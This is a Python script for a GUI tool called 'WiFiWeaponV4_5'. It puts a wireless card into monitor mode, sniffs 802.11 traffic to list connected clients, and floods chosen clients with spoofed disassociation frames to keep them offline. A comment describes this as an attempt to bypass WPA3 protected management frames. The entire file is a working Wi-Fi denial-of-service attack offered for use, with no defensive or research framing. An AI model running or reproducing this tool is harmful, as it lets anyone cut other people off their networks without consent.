import os, sys, time, threading
from scapy.all import *
import tkinter as tk

class WiFiWeaponV4_5:
    def __init__(self, iface):
        self.iface = iface
        self.clients = {}  
        self.persistent_targets = set()
        self.calibrated_timeouts = {} 
        
        self.prepare_hardware()
        
        self.root = tk.Tk()
        self.root.title("Surgical Restore v4.5")
        self.root.geometry("700x520")
        self.root.configure(bg="#0a0a0a")

        self.listbox = tk.Listbox(self.root, selectmode='multiple', bg="#111", fg="#00FF41", font=("Courier", 10), height=15)
        self.listbox.pack(padx=10, pady=10, fill="x")

        # Logic Buttons
        btn_frame = tk.Frame(self.root, bg="#0a0a0a")
        btn_frame.pack()
        
        tk.Button(btn_frame, text="ATTACK SELECTED", command=self.toggle_persistent, bg="#AA0000", fg="white", width=20).pack(side="left", padx=5)
        tk.Button(btn_frame, text="RESTORE ALL", command=self.restore_internet, bg="#0055ff", fg="white", width=20).pack(side="left", padx=5)

        threading.Thread(target=self.discovery_engine, daemon=True).start()
        threading.Thread(target=self.attack_engine, daemon=True).start()

    def prepare_hardware(self):
        os.system(f"sudo airmon-ng check kill")
        os.system(f"sudo ip link set {self.iface} down")
        os.system(f"sudo iw dev {self.iface} set type monitor")
        os.system(f"sudo ip link set {self.iface} up")

    def discovery_engine(self):
        def handler(pkt):
            if pkt.haslayer(Dot11):
                dot11 = pkt.getlayer(Dot11)
                # Map clients to APs
                if dot11.type == 2:
                    c, b = dot11.addr2, dot11.addr3
                    if b and c and c != b and c != "ff:ff:ff:ff:ff:ff":
                        if c not in self.clients:
                            self.clients[c] = {"BSSID": b, "last_query": 0}
                            self.root.after(0, self.refresh_ui)
                
                # Logic: Catch the SA Query for calibration
                if dot11.type == 0 and dot11.subtype == 13 and raw(pkt.payload).startswith(b'\x08'):
                    if dot11.addr1 in self.clients:
                        self.clients[dot11.addr1]["last_query"] = time.time()

        sniff(iface=self.iface, prn=handler, store=0)

    def attack_engine(self):
        while True:
            for client_mac in list(self.persistent_targets):
                data = self.clients.get(client_mac)
                if not data: continue
                
                b = data["BSSID"]
                # Logic: WPA3/PMF bypass attempt using Reason 30
                # Reason 30 = "Disassociated due to lack of SA Query response"
                p = RadioTap()/Dot11(addr1=client_mac, addr2=b, addr3=b)/Dot11Disas(reason=30)
                sendp(p, count=20, inter=0.01, verbose=False)
                
            time.sleep(0.5)

    def restore_internet(self):
        # Logic: Send 'Invite' frames to all targets to force quick reconnection
        print("[*] Restoring connections...")
        targets = list(self.persistent_targets)
        self.persistent_targets.clear() # Stop the attack loop
        
        for client_mac in targets:
            data = self.clients.get(client_mac)
            if data:
                b = data["BSSID"]
                # Send Authentication frame to tell client the AP is ready
                restore_pkt = RadioTap()/Dot11(addr1=client_mac, addr2=b, addr3=b)/Dot11Auth(algo=0, seqnum=1, status=0)
                sendp(restore_pkt, count=10, verbose=False)
        
        self.refresh_ui()

    def refresh_ui(self):
        self.listbox.delete(0, tk.END)
        for mac, info in self.clients.items():
            status = "!! BLOCKED !!" if mac in self.persistent_targets else "[STABLE]"
            self.listbox.insert(tk.END, f"{status} Client: {mac} | AP: {info['BSSID']}")

    def toggle_persistent(self):
        for i in self.listbox.curselection():
            mac = list(self.clients.keys())[i]
            if mac in self.persistent_targets: self.persistent_targets.remove(mac)
            else: self.persistent_targets.add(mac)
        self.refresh_ui()

if __name__ == "__main__":
    if len(sys.argv) < 2: print("Usage: sudo python3 weapon.py [interface]")
    else: WiFiWeaponV4_5(sys.argv[1]).root.mainloop()
